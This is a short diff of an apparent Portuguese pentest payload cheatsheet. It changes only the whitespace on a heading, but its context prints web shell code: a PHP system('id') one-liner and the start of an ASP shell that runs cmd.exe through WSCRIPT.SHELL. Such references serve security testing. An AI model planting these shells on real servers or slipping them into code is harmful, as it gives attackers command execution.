@@ -203,7 +203,7 @@ Tags: `#quickref` `#cheatsheet` `#comandos` `#payloads` `#ctrlf`
 	<?php system('id');?>
 
 
- 	SHELL EM ASP (shell.asp)
+	SHELL EM ASP (shell.asp)
 	<%
 	Set oS = Server.CreateObject("WSCRIPT.SHELL")
 	Set objCmdExec = oS.exec("cmd.exe /c ipconfig")
